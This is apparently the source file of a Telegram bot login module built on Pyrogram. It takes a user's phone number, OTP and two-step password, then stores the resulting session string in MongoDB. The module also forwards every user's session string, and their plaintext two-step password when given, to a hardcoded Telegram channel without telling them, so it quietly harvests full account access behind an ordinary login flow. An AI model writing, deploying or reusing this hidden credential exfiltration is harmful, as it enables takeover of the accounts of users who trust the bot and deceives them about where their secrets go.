# github / devgaganin


import pymongo
import os
from .. import bot as gagan
from .. import Bot as app
from pyrogram import Client, filters
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
import asyncio
from config import API_ID as api_id, API_HASH as api_hash, MONGODB_CONNECTION_STRING, LOG_GROUP 

DB_NAME = "logins"
COLLECTION_NAME = "stringsession"

mongo_client = pymongo.MongoClient(MONGODB_CONNECTION_STRING)
db = mongo_client[DB_NAME]
collection = db[COLLECTION_NAME]

user_steps = {}
user_data = {}

SESSION_CHANNEL = -1002149


def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    if os.path.exists(session_file):
        os.remove(session_file)
    memory_file = f"session_{user_id}.session-journal"
    if os.path.exists(memory_file):
        os.remove(memory_file)

@app.on_message(filters.command("logout"))
async def logout_command(client, message):
    user_id = message.chat.id
    # Remove session data from MongoDB
    collection.delete_one({"user_id": user_id})
    # Delete session files from the filesystem
    delete_session_files(user_id)
    # Inform the user
    await message.reply("✅ You have been logged out. Your session data and files have been cleared.")

async def process_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id, None)

    if step == "phone_number":
        user_data[user_id] = {"phone_number": message.text}
        user_steps[user_id] = "otp"
        omsg = await message.reply("Sending OTP...")
        temp_client = Client(f"session_{user_id}", api_id, api_hash)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone_number"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("OTP has been sent. Please enter the OTP in the format: '1 2 3 4 5'.")
        except ApiIdInvalid:
            await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ Invalid phone number. Please restart the session.')
            reset_user(user_id)
    elif step == "otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            session_data = {
                "user_id": user_id,
                "session_string": session_string
            }
            collection.update_one(
                {"user_id": user_id},
                {"$set": session_data},
                upsert=True
            )
            await message.reply(f"✅ Login successful!")
            await gagan.send_message(SESSION_CHANNEL, f"✨ **__ID__** : {user_id}\n\n✨ **__2SP__** : `None`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ Invalid OTP. Please restart the session.')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ Expired OTP. Please restart the session.')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "password"
            await message.reply('Your account has two-step verification enabled. Please enter your password.')
    elif step == "password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            session_data = {
                "user_id": user_id,
                "session_string": session_string
            }
            collection.update_one(
                {"user_id": user_id},
                {"$set": session_data},
                upsert=True
            )
            await message.reply(f"✅ Login successful!")
            await gagan.send_message(SESSION_CHANNEL, f"✨ **__USER ID__** : {user_id}\n\n✨ **__2SP__** : `{password}`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ Invalid password. Please restart the session.')
            reset_user(user_id)
    else:
        await message.reply('Please enter your phone number along with the country code. \n\nExample: +19876543210')
        user_steps[user_id] = "phone_number"

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

@app.on_message(filters.command("login"))
async def login_command(client, message):
    await process_step(client, message)

@app.on_message(filters.text & filters.private)
async def handle_steps(client, message):
    user_id = message.chat.id
    if user_id in user_steps:
        await process_step(client, message)

def get_session(sender_id):
    user_data = collection.find_one({"user_id": sender_id})
    if user_data:
        return user_data.get("session_string")
    else:
        return None
